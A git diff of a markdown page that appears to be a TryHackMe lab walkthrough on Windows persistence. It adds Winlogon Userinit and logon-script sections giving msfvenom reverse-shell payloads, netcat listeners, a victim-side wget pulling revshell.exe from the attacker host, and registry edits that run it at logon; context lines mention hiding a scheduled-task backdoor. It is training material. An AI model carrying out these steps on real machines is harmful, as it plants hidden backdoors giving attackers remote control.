@@ -283,7 +283,7 @@ nc -lvp 4448
 
 
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
 
@@ -466,7 +466,7 @@ c:\tools\pstools\PsExec64.exe -s -i regedit
 
 **Location**: Computer\HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (7).png" alt=""><figcaption></figcaption></figure>
 
 We will then delete the security descriptor for our task.
 
@@ -542,7 +542,7 @@ Now be sure to sign out of your session from the start menu (closing the RDP win
 
 And log back via RDP. You should immediately receive a connection back to your attacker's machine.
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Run / RunOnceYou can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:
 
@@ -596,7 +596,7 @@ Note: While in a real-world set-up you could use any name for your registry entr
 <pre><code><strong>C:\tools\pstools\PsExec64.exe -i -s regedit
 </strong></code></pre>
 
-![](../../.gitbook/assets/image.png)
+![](<../../.gitbook/assets/image (3).png>)
 
 <figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -604,7 +604,122 @@ After doing this, sign out of your current session and log in again, and you sho
 
 <figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-###
+### Winlogon
+
+Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).
+
+Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:
+
+* `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
+* `shell` points to the system's shell, which is usually `explorer.exe`.
+
+
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4452 -f exe -o revshell.exe
+```
+
+**Kali**
+
+```
+python3 -m http.server
+```
+
+**Kali #2**
+
+```
+nc -lvnp 4452
+```
+
+**Victim(powershell)**
+
+```
+wget http://$KALI:8000/revshell.exe -O revshell.exe
+```
+
+**Victim(powershell)**
+
+```
+move revshell.exe C:\Windows
+```
+
+We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.
+
+Note: While both `shell` and `Userinit` could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use `Userinit`.
+
+**Victim(powershell)**
+
+<pre><code><strong>C:\tools\pstools\PsExec64.exe -i -s regedit
+</strong></code></pre>
+
+<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+Add: C:\Windows\revshell.exe
+
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+### Logon scripts
+
+One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.
+
+Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.
+
+Let's first create a reverse shell to use for this technique.
+
+**Kali**
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4453 -f exe -o revshell.exe
+```
+
+**Kali**
+
+```
+python3 -m http.server
+```
+
+**Kali #2**
+
+```
+nc -lvnp 4453
+```
+
+**Victim(powershell)**
+
+```
+wget http://$KALI:8000/revshell.exe -O revshell.exe
+```
+
+**Victim(powershell)**
+
+```
+move revshell.exe C:\Windows
+```
+
+To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:
+
+**NOTE:** Remember to open registry without PsExec64 to have 'HKCU\Environment' for the current logged user. (PsExec64 starts registry with SYSTEM).
+
+**Victim(powershell)**
+
+<pre><code><strong>regedit
+</strong></code></pre>
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
+
+After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
+
+<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+
+
 
 ### Persisting Through Existing Services
 
